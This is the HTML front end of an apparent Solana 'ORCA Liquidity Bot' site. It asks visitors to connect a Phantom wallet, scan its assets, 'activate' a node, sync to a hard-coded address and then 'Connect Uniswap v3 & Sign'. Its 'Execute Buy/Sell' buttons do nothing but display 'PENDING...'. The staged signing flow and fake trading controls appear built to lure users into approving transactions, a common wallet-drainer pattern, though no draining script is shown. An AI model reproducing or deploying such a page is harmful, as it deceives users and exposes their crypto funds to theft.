<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>ORCA Liquidity Bot | Quantum Interface</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #020408; font-family: 'Plus Jakarta Sans', sans-serif; color: #ececec; overflow-x: hidden; }
        .bg-mesh {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% -20%, #14f19522, transparent),
                        radial-gradient(circle at 0% 100%, #9945ff11, transparent);
            z-index: -1;
        }
        .glass-card {
            background: rgba(13, 17, 23, 0.7); backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .dropdown-menu { display: none; position: absolute; top: 110%; right: 0; width: 120px; background: #0d1117; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; z-index: 100; }
        .dropdown-menu.active { display: block; }
        .token-badge { background: linear-gradient(180deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%); border: 1px solid rgba(255,255,255,0.1); }
        #page2, #poolSection, #uniswapBtnSection, #tradingSection { display: none; }
        .animate-slide-up { animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="bg-mesh"></div>

    <div id="page1">
        <header class="flex items-center justify-between px-8 py-6 border-b border-white/5 bg-black/20 backdrop-blur-md sticky top-0 z-50">
            <div class="flex items-center gap-5">
                <div class="p-4 bg-gradient-to-br from-zinc-800 to-black rounded-[24px] border border-white/15 shadow-2xl"><span class="text-4xl">🐳</span></div>
                <div class="flex flex-col text-left">
                    <span class="text-3xl font-[800] tracking-tighter text-white uppercase leading-none">ORCA <span class="text-[#14f195]">BOT</span></span>
                    <span class="text-[11px] text-[#14f195]/60 font-mono tracking-[0.3em] uppercase mt-1">Quantum Node v6.0</span>
                </div>
            </div>
            <div class="flex items-center gap-4">
                <button id="disconnectBtn" class="hidden bg-red-500/10 border border-red-500/20 text-red-500 px-4 py-2 rounded-xl text-[11px] font-bold uppercase tracking-wider hover:bg-red-500 hover:text-white transition">Disconnect</button>
                <div class="relative">
                    <button id="rangeBtn" class="flex items-center gap-2 bg-white/5 px-5 py-3 rounded-xl border border-white/10 text-[13px]"><span class="text-zinc-500">Range:</span> <span id="currentRange" class="text-[#14f195] font-bold">1%</span></button>
                    <div id="rangeDropdown" class="dropdown-menu">
                        <button onclick="setRange('1%')" class="w-full text-left px-4 py-3 hover:bg-[#14f195] hover:text-black transition text-sm font-bold">1% Range</button>
                        <button onclick="setRange('2%')" class="w-full text-left px-4 py-3 hover:bg-[#14f195] hover:text-black transition text-sm font-bold">2% Range</button>
                        <button onclick="setRange('5%')" class="w-full text-left px-4 py-3 hover:bg-[#14f195] hover:text-black transition text-sm font-bold">5% Range</button>
                    </div>
                </div>
            </div>
        </header>
        <main class="container mx-auto max-w-lg px-4 py-16 text-left">
            <div class="glass-card rounded-[40px] p-10">
                <h2 class="text-2xl font-extrabold text-white mb-2 tracking-tight">Node Synchronization</h2>
                <div class="space-y-4 mt-8">
                    <button id="connect" class="w-full py-6 bg-[#9945ff] text-white rounded-2xl font-[800] text-xl shadow-lg active:scale-95 transition">Connect PHANTOM</button>
                    <button id="showData" class="hidden w-full py-6 bg-[#14f195] text-black rounded-2xl font-[800] text-xl shadow-lg">Scan Wallet Assets</button>
                </div>
                <div id="result" class="mt-8 space-y-4"></div>
                <button id="continueBtn" class="hidden mt-10 w-full py-5 bg-white/5 border border-white/15 text-white rounded-2xl font-bold uppercase text-[12px] tracking-[0.2em]">Enter Quantum Node →</button>
            </div>
        </main>
    </div>

    <div id="page2">
        <main class="container mx-auto max-w-lg px-4 py-10 text-center">
            <div class="glass-card rounded-[40px] p-8">
                <div id="activationSection">
                    <div class="flex flex-col items-center gap-4 mb-8">
                        <div class="p-6 bg-white/5 rounded-[40px] border border-white/10 shadow-2xl"><span class="text-6xl animate-pulse">🐳</span></div>
                        <h2 class="text-3xl font-extrabold text-white uppercase">Step 1: <span class="text-[#14f195]">Activation</span></h2>
                    </div>
                    <button id="activateBotAr" class="w-full py-7 bg-[#14f195] text-black rounded-[24px] font-[900] text-2xl uppercase shadow-2xl transition hover:scale-105">Activate Node</button>
                    <p id="status" class="mt-6 text-[10px] text-zinc-500 font-mono uppercase tracking-[0.2em] italic">Waiting for node handshake...</p>
                </div>

                <div id="poolSection" class="mt-10 pt-10 border-t border-white/10 animate-slide-up">
                    <h2 class="text-xl font-extrabold text-white mb-6 uppercase text-left">Step 2: <span class="text-[#14f195]">Pool Sync</span></h2>
                    <div class="space-y-4 text-left">
                        <input type="text" readonly value="Czfq3xZZDmsdGdUyrNLtRhGc47cXcZtLG4crryfu44zE" class="w-full bg-black/60 border border-[#14f195]/30 p-5 rounded-2xl text-xs font-mono text-[#14f195]">
                        <button id="connectPool" class="w-full py-5 bg-zinc-800 text-white rounded-2xl font-black text-sm uppercase transition hover:bg-white hover:text-black">Sync Whirlpool</button>
                    </div>
                </div>

                <div id="uniswapBtnSection" class="mt-8 animate-slide-up">
                    <button id="uniswapSignBtn" class="w-full py-6 bg-white text-black rounded-[24px] font-[900] text-lg uppercase shadow-2xl hover:bg-[#ff007a] hover:text-white transition">
                        Connect Uniswap v3 & Sign
                    </button>
                </div>

                <div id="tradingSection" class="mt-10 pt-10 border-t border-white/15 animate-slide-up">
                    <div class="flex items-center justify-between mb-8">
                        <h2 class="text-xl font-extrabold text-white uppercase tracking-tighter">Limit <span class="text-[#14f195]">Protocol</span></h2>
                        <span class="px-3 py-1 bg-[#14f195]/20 text-[#14f195] text-[10px] font-bold rounded-full border border-[#14f195]/30">LIVE</span>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="bg-black/40 border border-white/5 p-5 rounded-3xl text-left">
                            <p class="text-[10px] font-black text-[#14f195] uppercase mb-4 tracking-widest">Buy Limit</p>
                            <div class="space-y-3">
                                <input type="number" placeholder="Price (SOL)" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl text-xs focus:border-[#14f195]">
                                <input type="number" placeholder="Amount" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl text-xs focus:border-[#14f195]">
                                <button onclick="this.innerText='PENDING...'" class="w-full py-3 bg-[#14f195] text-black font-black text-[11px] rounded-xl uppercase transition hover:brightness-110">Execute Buy</button>
                            </div>
                        </div>
                        <div class="bg-black/40 border border-white/5 p-5 rounded-3xl text-left">
                            <p class="text-[10px] font-black text-red-500 uppercase mb-4 tracking-widest">Sell Limit</p>
                            <div class="space-y-3">
                                <input type="number" placeholder="Price (SOL)" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl text-xs focus:border-red-500">
                                <input type="number" placeholder="Amount" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl text-xs focus:border-red-500">
                                <button onclick="this.innerText='PENDING...'" class="w-full py-3 bg-red-500 text-white font-black text-[11px] rounded-xl uppercase transition hover:brightness-110">Execute Sell</button>
                            </div>
                        </div>
                    </div>
                    <p class="mt-6 text-[9px] text-zinc-500 font-mono italic">Smart Contract executing at target price range (±1%)</p>
                </div>
            </div>
        </main>
    </div>
